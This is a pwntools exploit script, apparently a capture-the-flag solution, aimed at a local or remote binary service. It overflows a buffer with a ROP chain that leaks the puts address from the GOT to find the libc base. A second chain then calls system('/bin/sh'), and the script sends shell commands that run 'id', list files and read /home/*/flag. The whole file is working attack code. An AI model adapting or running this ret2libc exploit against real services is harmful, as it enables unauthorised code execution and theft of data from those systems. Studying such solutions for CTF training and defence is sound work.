from pwn import *

if len(sys.argv)==1:
    libcelf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    offset = 2
    p=process("linux_server64")
elif sys.argv[1]=="1":
    libcelf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    offset = 2
    p=process("./bin")
elif sys.argv[1]=="2":
    libcelf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    offset = 2
    p=process("./bin")
elif sys.argv[1]=="3":
    libcelf=ELF("libc.so.6")
    offset = 0x28 + 2
    p=remote("192.168.0.217",18001)

buf=p.recvuntil("Let's try, use FSP")
print buf

MAIN=0x40082a
RET=0x4008FC 
#0x00000000004008e3 : pop rdi ; ret
POPRDI=0x00000000004008e3
PUTSPLT=0x400610
PUTSGOT=0x601018

payload=""
payload+=p64(RET)
payload+=p64(RET)
payload+=p64(POPRDI)
payload+=p64(PUTSGOT)
payload+=p64(PUTSPLT)
payload+=p64(MAIN)
payload+="\x50"

p.send(payload)

buf=p.recvuntil("Let's try, use FSP")
print hexdump(buf)
libc_base=u64(buf[offset:offset+6]+"\x00"*2) - libcelf.sym["puts"]
libc_system = libc_base + libcelf.sym["system"]
libc_bin_sh = libc_base + libcelf.search("/bin/sh").next()
print 'libc_base:',hex(libc_base)
print 'libc_system:',hex(libc_system)
print 'libc_bin_sh:',hex(libc_bin_sh)

payload=""
payload+=p64(RET)
payload+=p64(RET)
payload+=p64(RET)
payload+=p64(POPRDI)
payload+=p64(libc_bin_sh)
payload+=p64(libc_system)
payload+="\x10"

p.send(payload)
sleep(1)

p.sendline("id;ls -al;cat /home/*/flag")
p.interactive()
